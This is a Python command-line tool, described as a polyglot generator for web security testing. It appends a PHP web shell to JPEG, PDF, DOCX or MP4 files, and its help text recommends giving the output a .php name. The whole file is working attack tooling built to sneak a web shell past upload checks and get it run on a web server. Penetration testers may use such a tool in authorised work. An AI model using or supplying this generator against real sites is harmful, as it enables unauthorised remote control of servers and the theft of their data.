import os
import argparse

def read_file(filepath):
    with open(filepath, 'rb') as f:
        return f.read()

def write_file(filepath, content):
    with open(filepath, 'wb') as f:
        f.write(content)

# ---- JPEG + PHP Polyglot ----
def generate_polyglot_jpeg(image_path, php_shell_path, output_path):
    image_data = read_file(image_path)
    php_data = read_file(php_shell_path)

    # Basic method: append PHP code after JPEG EOF (FF D9)
    eof_index = image_data.rfind(b'\xff\xd9')
    if eof_index == -1:
        raise Exception("Invalid JPEG format - no EOF marker found.")

    polyglot = image_data[:eof_index+2] + php_data
    write_file(output_path, polyglot)
    print(f"[+] JPEG+PHP polyglot saved to: {output_path}")

# ---- PDF + PHP Polyglot ----
def generate_polyglot_pdf(pdf_path, php_shell_path, output_path):
    pdf_data = read_file(pdf_path)
    php_data = read_file(php_shell_path)

    # Add PHP after %%EOF with newlines to keep PDF valid
    polyglot = pdf_data + b"\n\n" + php_data
    write_file(output_path, polyglot)
    print(f"[+] PDF+PHP polyglot saved to: {output_path}")

# ---- DOCX + PHP Polyglot ----
def generate_polyglot_docx(docx_path, php_shell_path, output_path):
    docx_data = read_file(docx_path)
    php_data = read_file(php_shell_path)

    # DOCX is a zip file, so append PHP after it
    polyglot = docx_data + php_data
    write_file(output_path, polyglot)
    print(f"[+] DOCX+PHP polyglot saved to: {output_path}")

# ---- MP4 + PHP Polyglot ----
def generate_polyglot_mp4(mp4_path, php_shell_path, output_path):
    mp4_data = read_file(mp4_path)
    php_data = read_file(php_shell_path)

    polyglot = mp4_data + php_data
    write_file(output_path, polyglot)
    print(f"[+] MP4+PHP polyglot saved to: {output_path}")

# ---- Argument Parsing ----
def main():
    parser = argparse.ArgumentParser(description="Polyglot Generator - Create polyglot files for web security testing")
    parser.add_argument('--input', required=True, help="Path to the input file (image/pdf/docx/mp4)")
    parser.add_argument('--shell', required=True, help="Path to the PHP web shell")
    parser.add_argument('--type', required=True, choices=['jpeg', 'pdf', 'docx', 'mp4'], help="Type of polyglot")
    parser.add_argument('--output', required=True, help="Path for output polyglot file (should end with .php)")
    
    args = parser.parse_args()

    if args.type == 'jpeg':
        generate_polyglot_jpeg(args.input, args.shell, args.output)
    elif args.type == 'pdf':
        generate_polyglot_pdf(args.input, args.shell, args.output)
    elif args.type == 'docx':
        generate_polyglot_docx(args.input, args.shell, args.output)
    elif args.type == 'mp4':
        generate_polyglot_mp4(args.input, args.shell, args.output)
    else:
        print("Unsupported file type.")

if __name__ == '__main__':
    main()
